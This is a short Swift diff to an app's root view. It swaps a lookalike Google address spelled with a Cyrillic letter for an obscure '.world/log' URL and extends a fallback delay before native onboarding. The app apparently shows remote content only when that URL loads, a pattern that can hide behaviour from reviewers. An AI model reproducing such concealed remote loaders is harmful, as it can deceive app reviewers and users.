@@ -23,7 +23,7 @@ class OrientationManager: ObservableObject  {
 struct RootView: View {
     @State private var status: LoaderStatus = .LOADING
     @ObservedObject private var nav: NavGuard = NavGuard.shared
-    let url: URL = URL(string: "https://googlш.com")!
+    let url: URL = URL(string: "https://plunkamemwea.world/log")!
     
     @ObservedObject private var orientationManager: OrientationManager = OrientationManager.shared
     
@@ -59,7 +59,7 @@ struct RootView: View {
                 if result {
                     self.status = .DONE
                 } else {
-                    DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
+                    DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                         nav.currentScreen = .ONBOARDING
                     }
                     self.status = .ERROR
